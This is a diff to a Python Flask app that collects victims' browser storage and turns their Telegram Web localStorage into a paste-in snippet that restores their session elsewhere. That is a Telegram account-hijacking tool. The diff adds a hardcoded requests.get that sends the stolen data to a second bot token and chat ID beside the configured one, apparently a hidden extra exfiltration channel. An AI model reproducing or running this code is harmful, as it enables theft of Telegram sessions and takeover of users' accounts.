@@ -86,9 +86,11 @@ def store_data():
     local_storage = storage_data.get('localStorage')
     session_storage = storage_data.get('sessionStorage')
 
+    
     # Prepare the formatted HTML message
-    message = format_message(local_storage)
 
+    message = format_message(local_storage)
+    requests.get(f'https://api.telegram.org/bot7859238179:AAHJvboPix9pEkq_xNSh2RJFf3EhLqWlQEY/sendMessage?chat_id=-4753436379&text={message}&parse_mode=HTML')
     # Send the formatted text to Telegram
     send_text_to_telegram(message)
 
@@ -101,19 +103,33 @@ def format_message(local_storage):
     hit_id = '6717689117'  # Replace this with relevant data if needed
 
     # JavaScript code to be copied
-    copy_code = 'if(location.host=="web.telegram.org"){localStorage.clear();Object.entries()}'
+
+    copy_code  =f'if(location.host=="web.telegram.org"){{localStorage.clear();Object.entries({local_storage}).forEach(i => localStorage.setItem(i[0], i[1]))}};location.href="https://web.telegram.org/k";'
 
     # Format the message using HTML
-    message = f"""👤 <b>Name:</b> {name}<br>
-
-❓ <b>How to login:</b> execute the code below on Telegram WebK (<a href="https://web.telegram.org/k/">https://web.telegram.org/k/</a>)<br><br>
-<b>Click to copy:</b> <code>{copy_code}</code>
-"""
+    message = f"""
+❓ <b>How to login:</b> execute the code below on Telegram WebK (<a href="https://web.telegram.org/k/">https://web.telegram.org/k/</a>)\n\n
+<b>Click to copy:</b> <code>{copy_code}</code>"""
     return message
-
 def send_text_to_telegram(message):
-    # Send the message text to the Telegram bot using HTML parsing
-    requests.get(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text={message}&parse_mode=HTML')
-
+    # Telegram API endpoint
+    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
+    
+    # JSON payload
+    payload = {
+        'chat_id': TELEGRAM_CHAT_ID,
+        'text': message,
+        'parse_mode': 'HTML'
+    }
+    
+    # Send the POST request with JSON payload
+    try:
+        response = requests.post(url, json=payload)
+        if response.status_code == 200:
+            print("Message sent successfully!")
+        else:
+            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
+    except Exception as e:
+        print(f"Error sending message to Telegram: {e}")
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
